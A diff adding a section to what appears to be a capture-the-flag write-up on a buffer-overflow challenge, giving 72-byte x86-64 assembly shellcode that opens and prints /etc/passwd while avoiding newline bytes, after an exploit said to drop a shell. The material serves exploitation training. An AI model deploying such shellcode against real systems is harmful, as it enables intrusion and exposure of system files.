@@ -176,6 +176,30 @@ io.sendline(payload)
 io.interactive()
 </code></pre>
 <p>Running this code either locally or remotely should drop you a shell, note that you can practice writing your own shellcode, but the problem with the read function is that it reads input until it encounters a new line, this means if you write shellcode for this challenge it can't contains any 0x0a opcodes, for those who study at ASU you should be pretty good evading filters on shellcode :P</p>
+<h2 id="trying-different-shellcode"><a class="header" href="#trying-different-shellcode">Trying different shellcode</a></h2>
+<p>So i just previously said that we can test any kind of shellcode we want with this program, as long as it does not contains any <code>0x0a</code> bytes or is smaller or equal to 72 bytes.</p>
+<p>I've wrote the following shellcode which will read the /etc/passwd file, the shellcode is 72 bytes exactly so you shouldn't need any padding (shellcode -&gt; leaked address).</p>
+<pre><code class="language-x86asm">.global _start
+.intel_syntax noprefix
+
+_start:
+    xor esi, esi
+    lea rdi, [rip+etcpasswd]
+    mov rax, 2
+    syscall
+    mov rdi, 1
+    mov rsi, rax
+    mov rdx, 0
+    mov r10, 5000
+    mov rax, 40
+    syscall
+    mov rax, 60
+    syscall
+
+etcpasswd:
+    .ascii &quot;/etc/passwd\0&quot;
+</code></pre>
+<p>Running the challenge with this shellcode will output the <code>/etc/passwd</code> file, which is not particularly useful but it proves that we can execute pretty much the shellcode we want.</p>
 
                     </main>
 
